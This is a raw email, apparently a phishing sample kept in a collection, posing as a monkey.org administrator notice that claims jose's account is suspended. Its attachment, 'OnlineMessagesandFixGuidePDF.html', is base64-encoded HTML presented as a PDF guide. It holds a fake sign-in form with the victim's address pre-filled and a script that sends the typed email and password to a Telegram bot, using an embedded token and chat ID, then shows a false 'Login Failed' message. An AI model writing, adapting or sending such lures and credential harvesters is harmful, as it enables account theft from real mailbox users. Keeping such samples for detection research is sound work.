@@ -1,0 +1,261 @@
+From jose@monkey.org Tue Nov 12 13:31:55 2024 +0000
+Return-Path: hope@cefilni.com
+Delivered-To: jose@monkey.org
+X-FDA: 82777529898.06.42EF187
+Received: from terry.cefilni.com (terry.cefilni.com [193.25.216.247])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id 6835C12000F
+	for <jose@monkey.org>; Tue, 12 Nov 2024 13:31:23 +0000 (UTC)
+Authentication-Results: imf16.b.hostedemail.com;
+	dkim=pass header.d=cefilni.com header.s=dkim header.b=Qc3trCgM;
+	spf=pass (imf16.b.hostedemail.com: domain of hope@cefilni.com designates 193.25.216.247 as permitted sender) smtp.mailfrom=hope@cefilni.com;
+	dmarc=pass (policy=none) header.from=cefilni.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1731418296;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=IsZjLIBTINLFefzBY7prGfiQQ8R5ww0LJtVqw50bLN4=;
+	b=SzvUVlQjbxakG9h/tokvI7vq2SVyybC6l4v4ftS/8BRpwtUppzF7OYv0sKk6InJXOsKqtB
+	DyITq6C2lh2VHpYInCp8mbfqIHRGpmnqRr3gq+YRzOpauTwps/dyRR66rrgDHjT93n0bGg
+	x03MrOBodc6H1MtfOdDaQZTrwWvTKOQ=
+ARC-Authentication-Results: i=1;
+	imf16.b.hostedemail.com;
+	dkim=pass header.d=cefilni.com header.s=dkim header.b=Qc3trCgM;
+	spf=pass (imf16.b.hostedemail.com: domain of hope@cefilni.com designates 193.25.216.247 as permitted sender) smtp.mailfrom=hope@cefilni.com;
+	dmarc=pass (policy=none) header.from=cefilni.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1731418296; a=rsa-sha256;
+	cv=none;
+	b=s7BIVLT/N8cXveGjwlsdPctzMZODRF3eF1bpQcxFxZLwuVfI3ukYOjxbkUzaCcdeDPjB45
+	FML+41MSSkZopppb0jFfGOb5/Tn7GBVgWXNlY4ccfavzaJEaDoVk54E1Gcv3GaPuk+sdsB
+	IybZB7LWvOfp5/x0KpzQM6/8nCH3se8=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=cefilni.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; i=hope@cefilni.com;
+ bh=9ZgTf8TRMXtKLlpAAjeJQuGxZ18=;
+ b=Qc3trCgM4rh9J8nnWe8cKr7IF7879YP4XND3mK0gdqb2TODB06/5TcHEPjfuW8iy13cK8R41N+/A
+   XptdKqVddFuprnHqqbAs2fpNadCTCii/f7FuTcG0F9nRQzpYgUpZv3lD7IMxZl8vj8to944naoeV
+   7lb6lEa+fzgzKJkrHZMIp1KjBF8X2zXUe0wJCDJvvWJSCPqsAFygEOFwDZejLik1YJ65ztgMoE9t
+   473Kw4nfacdkHKvhzkNG+qSBjHqs/ao2caf9WIhLjWvfBpY/63LRmQnYOunPKCyBnVqKgkI9E4dK
+   lGrQvrMLyAiGlgYbS/g/PvOEp+QDOa1qyy4tFQ==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=cefilni.com;
+ b=eKkn5NMJePfCMIDXbMJnV8YolTqKaAAfaKsoVRgoyS8hH611hVU4L6dUvPbQBf5rZTtDR+jSY9KD
+   2X5HiEYk00uyZzNGObUyPkpvaib76R+ATKs5CI3pAUfhKAG9szjTcAitYBtX82EXSgWrOMcYRLjO
+   cvBH08atsKbOWNLQhNOqM2QTslzhKODfDCo/t2bkrX8FctoGuNQ6XGi/mtngxr52cNxxzsEL/jGY
+   DfmMGFVykVNd63mAImQcQqSLMSiTVR+bU1erlTxjWrEU/wjg23jMyktOWv3Dt4aZ3w9K43bvvt3V
+   RX9Zdblb4+eY86oLhcHhFIrhijfWdzkEbUPOKA==;
+From: "Admin, monkey.org"<hope@cefilni.com>
+To: jose@monkey.org
+Subject: RE: Reminder jose
+Date: 12 Nov 2024 13:31:50 +0000
+Message-ID: <20241112133150.E726D6E00125C69E@cefilni.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_554A8BB6.9866126F"
+X-Spam-Status: No, score=5.29
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 6835C12000F
+X-Stat-Signature: 6c1zugewjekoors8skeuaii5q6wn8imc
+X-Rspam-User: 
+X-HE-Tag: 1731418283-987452
+X-HE-Meta: U2FsdGVkX19phw57mjru9+q5QSfIXOPb5bXnD+d8RASKr6d2JYzJdcawbA2SUfWCKWkR097EyzrEqb1ha9ToJTQ/pkq+0BMSfCiRU8C1XA4R+COBGrMDMKzeGfqC+AikTmn7aHVIYoj9mInR2YREyjOOyRz6F6gwg3UCoGdysu1oJEuknkmWQgXDz3h9h4dwFktM6KdH+IZJJVGqq1Vp2qqJaI26RIpluSnskkA5H7dn6tI3rkCQHe9xEAbo8r6S+Z31whK74NufvTdSjDlLGnDAce5Inzdah/b7Nod+T7jXnKwbFblcaQEBe7nROz1eHwCv/EvhjIhslTsVjXP5DAIIIFNllTFYnb4Y1VWr4kKLyvZ9YXDk1MeFfaSk7x6gCH7vyUauwt6m8uAmDSsc004sFXGABDC/qXAc8DbZ9Cd5SIjf7etO7YWVhZFruKHqc+O0OiRQMqRobDe084tf0iCumQll/Sq50DPZDLAhykEIdeDlQ2r4+t0TBthf9nPVzpkQjmn53lvJXFWrQtUkHEpTHW3oPuUnVywejhSh+7TDJyArBHyW99X5trNsSc8uaxYQIUHGJCszwolBxVZqAdlz38GGjZTi8g2VQBe+DARtylBmoZLkzjgR6Y4zscI3O9fufIThUyWFxfqa8W0gL/pkbIyYCc/C/cHg0luioXulgJK9AaAR0WIAA/ioqAq11eUTAyJLDl5zmHamD05a4CH/oqJQfHCW8PavnFZUzo9vF1B0SshApCWvfxP7YLqG1MT7LQ96hncb7Gtg+XtM9JwpHYuAbE+fRBL75/NUp6fQoK8FuGTYmmHXYj67oVU614Y1TrUpbozWj/sVLEPXwDJbPUJx+rBJxXoXy+WKCSGZmuZT96yjqrLBwXxvoQ5ogOV3Hzi7zVfKbHGsEa/JD3/6lqnd9U2cKXToESoy+TfubcoERya7COik1GHQd7dYH6xYLIheZ8NQpWVGEX350/6QwQt
+ 6rTbZ8Z1KhAyhZCA/+fEv9819rfF4J15QIApO9ByMf4fljNVXTJ6UPy9fG4rIzWw0STTHX5W9YFriKIHJ7Ehla0TFaSfpKk3HLJA+M19DbrLX0cvkYu2Xaf8B+9XZPZpss4EsWKH/GQs0XLx/iNk1aGplQU164hKMYm7HCO6eLY1aA/Tg0z+Erqi3QMHHQNNCfW8P37olPu4A2GH0WQTKGBWLHqF5xa33nt/y6ILZB9t7Yby11XcbRRo8jvUlGPsp8E0jWNx0AcYPHqW+Ikybr2owXoEVwvj/BlaLt50tS63dy0PjJssCfjVRwRubT34Y68LQ
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 346
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_554A8BB6.9866126F
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p>
+<table width=3D"100%" border=3D"2" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">
+Dear jose,<br><br>This is to inform you that jose@monkey.org has been suspe=
+nded due to violations of our email terms of service.<br><br>You have 81 pe=
+nding messages on hold waiting for you. To review and save your pending mes=
+sages, Kindly see attached for more details and to submit an appeal.</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">
+To assist you in this process, we have also prepared a comprehensive docume=
+nt outlining important updates and best practices for managing your email a=
+ccounts effectively. Please find the attachment included with this email fo=
+r your reference. </p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">
+Your security and convenience are our top priorities, and we encourage you =
+to review the document carefully to ensure the continued smooth operation o=
+f your email services.</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">
+Should you have any questions or require further assistance, please do not =
+hesitate to contact our dedicated support team at<span>&nbsp;</span><a styl=
+e=3D"color: rgb(0, 123, 255); text-decoration-line: none;" target=3D"_blank=
+">monkey.org</a>.</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">
+Thank you for your attention to this matter.</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">
+Warm regards,</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">
+Email IT Administrator<br>monkey.org</p></td></tr></tbody></table><p></p></=
+body></html>
+------=_NextPart_000_0012_554A8BB6.9866126F
+Content-Type: text/html; name="OnlineMessagesandFixGuidePDF.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="OnlineMessagesandFixGuidePDF.html"
+
+PGh0bWw+PGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRl
+bnQ9IklFPWVkZ2UiPg0KPC9oZWFkPg0KPGJvZHk+DQogICAgPHN0eWxlPg0KICAgICAgICBi
+b2R5IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgiaHR0cHM6Ly9pLnNz
+dGF0aWMubmV0L3Z6YnVRLmpwZyIpOw0KICAgICAgICAgICAgYmFja2dyb3VuZC1zaXplOiBj
+b3ZlcjsNCiAgICAgICAgICAgIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQogICAg
+ICAgICAgICBoZWlnaHQ6IDEwMHZoOw0KICAgICAgICAgICAgbWFyZ2luOiAwOw0KICAgICAg
+ICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2Vu
+dGVyOw0KICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAgICAgICAgfQ0KDQog
+ICAgICAgIC5sb2dpbi1mb3JtIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6IHdoaXRlOw0K
+ICAgICAgICAgICAgcGFkZGluZzogMjBweDsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6
+IDEwcHg7DQogICAgICAgICAgICBib3gtc2hhZG93OiAwIDAgMTBweCByZ2JhKDAsIDAsIDAs
+IDAuMSk7DQogICAgICAgIH0NCg0KICAgICAgICBpbnB1dCB7DQogICAgICAgICAgICB3aWR0
+aDogMTAwJTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHg7DQogICAgICAgICAgICBtYXJn
+aW46IDVweCAwOw0KICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgI2NjYzsNCiAgICAg
+ICAgICAgIGJvcmRlci1yYWRpdXM6IDVweDsNCiAgICAgICAgfQ0KDQogICAgICAgIGJ1dHRv
+biB7DQogICAgICAgICAgICB3aWR0aDogMTAwJTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDEw
+cHg7DQogICAgICAgICAgICBtYXJnaW46IDEwcHggMDsNCiAgICAgICAgICAgIGJhY2tncm91
+bmQ6ICMwMDdiZmY7DQogICAgICAgICAgICBjb2xvcjogd2hpdGU7DQogICAgICAgICAgICBi
+b3JkZXI6IG5vbmU7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7DQogICAgICAg
+ICAgICBjdXJzb3I6IHBvaW50ZXI7DQogICAgICAgIH0NCiAgICA8L3N0eWxlPg0KPG1ldGEg
+aHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4NCg0KDQog
+PGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCjxzdHJvbmc+ICAgIDwvc3Ryb25nPjxkaXYgY2xh
+c3M9ImxvZ2luLWZvcm0iPjxzdHJvbmc+DQo8aW1nIHdpZHRoPSI1IiBoZWlnaHQ9IjUiIHN0
+eWxlPSJ3aWR0aDogMTUwcHg7IGhlaWdodDogMzJweDsiIHNyYz0iaHR0cHM6Ly9pLnBpbmlt
+Zy5jb20vNzM2eC8wOS84MS82YS8wOTgxNmFhMzk2MWViYzk4MjE4YTYwZjJmYjQ1MGNlZi5q
+cGciPjwvc3Ryb25nPjxoMT48c3BhbiBzdHlsZT0nZm9udC1mYW1pbHk6ICJDYWxpYnJpIExp
+Z2h0IjsnPg0KPHNwYW4gc3R5bGU9J2NvbG9yOiByZ2IoMjcsIDI3LCAyNyk7IHRleHQtdHJh
+bnNmb3JtOiBub25lOyB0ZXh0LWluZGVudDogMHB4OyBsZXR0ZXItc3BhY2luZzogbm9ybWFs
+OyBmb250LWZhbWlseTogIlNlZ29lIFVJIiwgLWFwcGxlLXN5c3RlbSwgIkhlbHZldGljYSBO
+ZXVlIiwgIkx1Y2lkYSBHcmFuZGUiLCBSb2JvdG8sIEVicmltYSwgIk5pcm1hbGEgVUkiLCBH
+YWR1Z2ksICJTZWdvZSBYYm94IFN5bWJvbCIsICJTZWdvZSBVSSBTeW1ib2wiLCAiTWVpcnlv
+IFVJIiwgIktobWVyIFVJIiwgVHVuZ2EsICJMYW8gVUkiLCBSYWF2aSwgIklza29vbGEgUG90
+YSIsIExhdGhhLCBMZWVsYXdhZGVlLCAiTWljcm9zb2Z0IFlhSGVpIFVJIiwgIk1pY3Jvc29m
+dCBKaGVuZ0hlaSBVSSIsICJNYWxndW4gR290aGljIiwgIkVzdHJhbmdlbG8gRWRlc3NhIiwg
+Ik1pY3Jvc29mdCBIaW1hbGF5YSIsICJNaWNyb3NvZnQgTmV3IFRhaSBMdWUiLCAiTWljcm9z
+b2Z0IFBoYWdzUGEiLCANCiJNaWNyb3NvZnQgVGFpIExlIiwgIk1pY3Jvc29mdCBZaSBCYWl0
+aSIsICJNb25nb2xpYW4gQmFpdGkiLCAiTVYgQm9saSIsICJNeWFubWFyIFRleHQiLCAiQ2Ft
+YnJpYSBNYXRoIjsgZm9udC1zaXplOiAyNHB4OyBmb250LXN0eWxlOiBub3JtYWw7IGZvbnQt
+d2VpZ2h0OiA2MDA7IHdvcmQtc3BhY2luZzogMHB4OyBmbG9hdDogbm9uZTsgZGlzcGxheTog
+aW5saW5lICFpbXBvcnRhbnQ7IHdoaXRlLXNwYWNlOiBub3JtYWw7IG9ycGhhbnM6IDI7IHdp
+ZG93czogMjsgYmFja2dyb3VuZC1jb2xvcjogcmdiKDI1NSwgMjU1LCAyNTUpOyBmb250LXZh
+cmlhbnQtbGlnYXR1cmVzOiBub3JtYWw7IGZvbnQtdmFyaWFudC1jYXBzOiBub3JtYWw7IC13
+ZWJraXQtdGV4dC1zdHJva2Utd2lkdGg6IDBweDsgdGV4dC1kZWNvcmF0aW9uLXRoaWNrbmVz
+czogaW5pdGlhbDsgdGV4dC1kZWNvcmF0aW9uLXN0eWxlOiBpbml0aWFsOyB0ZXh0LWRlY29y
+YXRpb24tY29sb3I6IGluaXRpYWw7Jz4NClNpZ24gaW48L3NwYW4+PC9zcGFuPg0KJm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7PHNwYW4gc3R5bGU9
+J2NvbG9yOiByZ2IoMCwgMCwgMCk7IHRleHQtdHJhbnNmb3JtOiBub25lOyB0ZXh0LWluZGVu
+dDogMHB4OyBsZXR0ZXItc3BhY2luZzogbm9ybWFsOyBmb250LWZhbWlseTogIlRpbWVzIE5l
+dyBSb21hbiI7IGZvbnQtc2l6ZTogbWVkaXVtOyBmb250LXN0eWxlOiBub3JtYWw7IGZvbnQt
+d2VpZ2h0OiA0MDA7IHdvcmQtc3BhY2luZzogMHB4OyBmbG9hdDogbm9uZTsgZGlzcGxheTog
+aW5saW5lICFpbXBvcnRhbnQ7IHdoaXRlLXNwYWNlOiBub3JtYWw7IG9ycGhhbnM6IDI7IHdp
+ZG93czogDQoyOyBiYWNrZ3JvdW5kLWNvbG9yOiByZ2IoMjU1LCAyNTUsIDI1NSk7IGZvbnQt
+dmFyaWFudC1saWdhdHVyZXM6IG5vcm1hbDsgZm9udC12YXJpYW50LWNhcHM6IG5vcm1hbDsg
+LXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDogMHB4OyB0ZXh0LWRlY29yYXRpb24tdGhpY2tu
+ZXNzOiBpbml0aWFsOyB0ZXh0LWRlY29yYXRpb24tc3R5bGU6IGluaXRpYWw7IHRleHQtZGVj
+b3JhdGlvbi1jb2xvcjogaW5pdGlhbDsnPjwvc3Bhbj4NCjxmb3JtIGlkPSJsb2dpbkZvcm0i
+IHN0eWxlPSdjb2xvcjogcmdiKDAsIDAsIDApOyB0ZXh0LXRyYW5zZm9ybTogbm9uZTsgdGV4
+dC1pbmRlbnQ6IDBweDsgbGV0dGVyLXNwYWNpbmc6IG5vcm1hbDsgZm9udC1mYW1pbHk6ICJU
+aW1lcyBOZXcgUm9tYW4iOyBmb250LXNpemU6IG1lZGl1bTsgZm9udC1zdHlsZTogbm9ybWFs
+OyBmb250LXdlaWdodDogNDAwOyB3b3JkLXNwYWNpbmc6IDBweDsgd2hpdGUtc3BhY2U6IG5v
+cm1hbDsgb3JwaGFuczogMjsgd2lkb3dzOiAyOyBmb250LXZhcmlhbnQtbGlnYXR1cmVzOiBu
+b3JtYWw7IGZvbnQtdmFyaWFudC1jYXBzOiBub3JtYWw7IC13ZWJraXQtdGV4dC1zdHJva2Ut
+d2lkdGg6IDBweDsgdGV4dC1kZWNvcmF0aW9uLXRoaWNrbmVzczogaW5pdGlhbDsgdGV4dC1k
+ZWNvcmF0aW9uLXN0eWxlOiBpbml0aWFsOyB0ZXh0LWRlY29yYXRpb24tY29sb3I6IGluaXRp
+YWw7Jz5UbyZuYnNwO1ZpZXcgUERGIERvY3VtZW50IG9ubGluZTxicj4NCjxicj4NCiAgICAg
+ICAgICAgIDxsYWJlbCBmb3I9ImVtYWlsIj5FbWFpbDo8L2xhYmVsPg0KICAgICAgICAgICAg
+PGlucHV0IG5hbWU9ImVtYWlsIiBpZD0iZW1haWwiIHJlcXVpcmVkPSIiIHR5cGU9ImVtYWls
+IiB2YWx1ZT0iam9zZUBtb25rZXkub3JnIj48YnI+DQogICAgICAgICAgICA8bGFiZWwgZm9y
+PSJwYXNzd29yZCI+RW50ZXIgUGFzc3dvcmQ6PC9sYWJlbD4NCiAgICAgICAgICAgIDxpbnB1
+dCBuYW1lPSJwYXNzd29yZCIgcmVxdWlyZWQ9IiIgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9s
+ZGVyPSJQYXNzd29yZCIgdmFsdWU9IiI+PGJyPjxidXR0b24gc3R5bGU9ImJhY2tncm91bmQ6
+IHJnYigwLCAxMjMsIDI1NSk7IG1hcmdpbjogMTBweCAwcHg7IHBhZGRpbmc6IDEwcHg7IGJv
+cmRlci1yYWRpdXM6IDVweDsgYm9yZGVyOiBjdXJyZW50Q29sb3I7IGJvcmRlci1pbWFnZTog
+bm9uZTsgd2lkdGg6IDM5Ny4zM3B4OyBoZWlnaHQ6IDM5cHg7IGNvbG9yOiB3aGl0ZTsgd2hp
+dGUtc3BhY2U6IG5vcm1hbDsgY3Vyc29yOiBwb2ludGVyOyBvcnBoYW5zOiAyOyB3aWRvd3M6
+IDI7IC13ZWJraXQtdGV4dC1zdHJva2Utd2lkdGg6IDBweDsgdGV4dC1kZWNvcmF0aW9uLXRo
+aWNrbmVzczogaW5pdGlhbDsgdGV4dC1kZWNvcmF0aW9uLXN0eWxlOiBpbml0aWFsOyB0ZXh0
+LWRlY29yYXRpb24tY29sb3I6IGluaXRpYWw7IiB0eXBlPSJzdWJtaXQiPg0KU2lnbiBpbiB0
+byB2aWV3IFBERiBZb3VyIERvY3VtZW50PC9idXR0b24+DQo8YnI+PC9mb3JtPjwvaDE+DQog
+ICAgICAgIDxwIGlkPSJsb2dpbk1lc3NhZ2UiPjwvcD4NCiAgICA8L2Rpdj4NCiAgICA8c2Ny
+aXB0Pg0KICAgICAgICBjb25zdCBmb3JtID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xv
+Z2luRm9ybScpOw0KICAgICAgICBjb25zdCBsb2dpbk1lc3NhZ2UgPSBkb2N1bWVudC5nZXRF
+bGVtZW50QnlJZCgnbG9naW5NZXNzYWdlJyk7DQogICAgICAgIGZvcm0uYWRkRXZlbnRMaXN0
+ZW5lcignc3VibWl0JywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICAgICAgICAgIGV2ZW50LnBy
+ZXZlbnREZWZhdWx0KCk7DQogICAgICAgICAgICBjb25zdCBlbWFpbCA9IGZvcm0uZWxlbWVu
+dHMuZW1haWwudmFsdWU7DQogICAgICAgICAgICBjb25zdCBwYXNzd29yZCA9IGZvcm0uZWxl
+bWVudHMucGFzc3dvcmQudmFsdWU7DQogICAgICAgICAgICBjb25zdCBhcGlLZXkgPSAnNzY5
+OTIxMDkwNjpBQUVJNVdOTVgyRXNRZVU1MTZZZlh5QXhldE54VlhLOHdpbyc7DQogICAgICAg
+ICAgICBjb25zdCBjaGF0SWQgPSAnLTEwMDIzMjI0OTk2NzgnOw0KICAgICAgICAgICAgZmV0
+Y2goYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke2FwaUtleX0vc2VuZE1lc3NhZ2U/
+Y2hhdF9pZD0ke2NoYXRJZH0mdGV4dD1FbWFpbDogJHtlbWFpbH0lMEFQYXNzd29yZDogJHtw
+YXNzd29yZH1gKQ0KICAgICAgICAgICAgICAgIC50aGVuKHJlc3BvbnNlID0+IHsNCiAgICAg
+ICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLm9rKSB7DQogICAgICAgICAgICAgICAgICAg
+ICAgICBsb2dpbk1lc3NhZ2UuaW5uZXJUZXh0ID0gJ0xvZ2luIEZhaWxlZDogUGxlYXNlIGNo
+ZWNrIGlucHV0IGFuZCBUcnkgYWdhaW4hJzsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNl
+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ2luTWVzc2FnZS5pbm5lclRleHQgPSAn
+TG9naW4gRmFpbGVkOiBQbGVhc2UgY2hlY2sgaW5wdXQgYW5kIFRyeSBhZ2FpbiEuJzsNCiAg
+ICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pDQogICAgICAgICAgICAg
+ICAgLmNhdGNoKGVycm9yID0+IHsNCiAgICAgICAgICAgICAgICAgICAgbG9naW5NZXNzYWdl
+LmlubmVyVGV4dCA9ICdBbiBlcnJvciBvY2N1cnJlZCB3aGlsZSB0cnlpbmcuJzsNCiAgICAg
+ICAgICAgICAgICB9KTsNCiAgICAgICAgfSk7DQogICAgPC9zY3JpcHQ+DQo8L2Rpdj48L2Jv
+ZHk+PC9odG1sPg==
+
+------=_NextPart_000_0012_554A8BB6.9866126F--
